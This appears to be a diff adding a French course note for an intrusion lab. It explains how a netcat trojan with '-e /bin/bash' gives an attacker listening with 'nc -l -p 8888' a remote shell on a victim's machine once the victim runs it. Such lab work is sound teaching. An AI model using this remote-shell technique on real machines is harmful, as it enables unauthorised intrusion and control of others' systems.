@@ -1,0 +1,5 @@
+============================ TP1 : INTRUSION ==============================
+
+Trojan:
+Dans la boucle infinie, -q0 veut dire qu'on quitte le programme 0 secondes après EOF, et -e /bin/bash veut dire qu'on exécute ce script
+On écoute sur la machine hacker avec "nc -l -p 8888", puis quand le commercial execute le trojan, le script bash permet de taper toutes les commandes qu'on veut qui vont s'exécuter sur la machine hackée.
